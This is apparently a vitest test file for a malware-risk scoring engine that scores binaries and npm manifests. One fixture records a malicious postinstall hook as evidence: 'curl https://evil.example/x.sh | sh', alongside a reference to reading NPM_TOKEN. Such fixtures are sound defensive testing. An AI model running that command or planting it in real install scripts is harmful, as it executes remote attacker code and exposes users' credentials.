import { describe, expect, it } from "vitest";

import { emptyBehaviorSummary, emptyScriptThreatSummary, sampleAnalyses } from "@binshield/analysis-types";
import type { ManifestAnalysis } from "@binshield/analysis-types";
import {
  aggregatePackageRisk,
  aggregatePackageRiskWithManifest,
  riskLevelFromScore,
  scoreBinary,
  scoreManifest
} from "./index";

function makeManifest(overrides: Partial<ManifestAnalysis> = {}): ManifestAnalysis {
  return {
    id: "manifest_test",
    ecosystem: "npm",
    lifecycleHooks: {},
    hasInstallScripts: false,
    analyzedFiles: [],
    riskScore: 0,
    riskLevel: "none",
    threats: emptyScriptThreatSummary(),
    findings: [],
    knownMalwareAdvisoryIds: [],
    sourceMatchConfidence: "medium",
    analyzedAt: "2026-05-21T00:00:00.000Z",
    ...overrides
  };
}

describe("risk engine", () => {
  it("maps scores to levels", () => {
    expect(riskLevelFromScore(0)).toBe("none");
    expect(riskLevelFromScore(12)).toBe("low");
    expect(riskLevelFromScore(34)).toBe("medium");
    expect(riskLevelFromScore(65)).toBe("high");
    expect(riskLevelFromScore(91)).toBe("critical");
  });

  it("scores suspicious behaviors above benign ones", () => {
    const low = scoreBinary({
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 4,
      functionCount: 20
    });
    const high = scoreBinary({
      behaviors: {
        ...emptyBehaviorSummary(),
        network: { detected: true, details: ["Connects to remote host"] },
        dataExfiltration: { detected: true, details: ["Uploads environment variables"] },
        obfuscation: { detected: true, details: ["Encrypted strings"] }
      },
      findings: [
        {
          severity: "critical",
          title: "Outbound exfiltration",
          description: "Sends data to an unknown domain",
          recommendation: "Block package"
        }
      ],
      importCount: 18,
      functionCount: 52
    });

    expect(high.riskScore).toBeGreaterThan(low.riskScore);
    expect(high.riskLevel).toBe("critical");
  });

  it("aggregates package risk from binaries", () => {
    const aggregate = aggregatePackageRisk(sampleAnalyses[0].binaries);
    expect(aggregate.riskScore).toBeGreaterThan(0);
    expect(aggregate.riskLevel).toBe("low");
  });

  it("scores a malicious install script even when the package has no binaries", () => {
    const manifest = makeManifest({
      hasInstallScripts: true,
      threats: {
        ...emptyScriptThreatSummary(),
        remoteCodeExecution: { detected: true, details: ["postinstall pipes curl into a shell"] },
        environmentTheft: { detected: true, details: ["reads process.env.NPM_TOKEN"] }
      },
      findings: [
        {
          category: "remoteCodeExecution",
          severity: "critical",
          title: "Remote code execution in postinstall hook",
          description: "postinstall hook downloads and executes remote code at install time",
          filePath: "package.json#scripts.postinstall",
          evidence: "curl https://evil.example/x.sh | sh",
          lifecycleHook: "postinstall",
          recommendation: "Do not install this package."
        }
      ]
    });

    const score = scoreManifest(manifest);
    expect(score.riskScore).toBeGreaterThan(0);
    expect(score.riskLevel).toBe("critical");

    // The old binary-only path returns "none" for a package with no binaries —
    // this is the gap the manifest path closes.
    expect(aggregatePackageRisk([]).riskLevel).toBe("none");
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("forces a critical verdict for known-malware matches", () => {
    const manifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(manifest)).toEqual({ riskScore: 100, riskLevel: "critical" });
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("takes the max of binary and manifest risk, never diluting either", () => {
    const cleanManifest = makeManifest();
    const binaryOnly = aggregatePackageRisk(sampleAnalyses[0].binaries);
    const merged = aggregatePackageRiskWithManifest(sampleAnalyses[0].binaries, cleanManifest);
    expect(merged.riskScore).toBe(binaryOnly.riskScore);
  });
});
